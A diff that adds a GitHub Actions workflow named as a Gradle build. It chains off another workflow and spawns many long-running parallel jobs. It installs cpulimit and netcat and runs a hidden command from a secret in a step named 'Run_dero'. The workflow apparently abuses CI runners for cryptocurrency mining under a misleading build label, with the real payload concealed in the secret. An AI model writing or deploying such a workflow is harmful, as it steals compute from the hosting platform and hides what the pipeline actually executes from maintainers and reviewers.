@@ -1,0 +1,36 @@
+name: gradle_2
+
+on: 
+  workflow_dispatch:
+  workflow_run:
+    workflows: ["gradle_1"]
+    types:
+      - completed
+
+jobs:
+  build:
+    name: KolaseIX
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 40
+      fail-fast: false
+      matrix: 
+        numb: [1.12, 1.15]
+        char: [A, B, C, D, E, F, G, H, I, J]
+    timeout-minutes: 350
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.numb }}
+    steps:
+    - name: Set up Go ${{ matrix.numb }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.numb }}
+      id: go
+    - name: KolaseIX
+      uses: actions/checkout@v1
+    - name: KolaseIX_run
+      run: sudo apt-get update && sudo apt-get install -y cpulimit netcat timelimit
+    - name: Run_dero
+      continue-on-error: true
+      run: ${{ secrets.PUSH }}
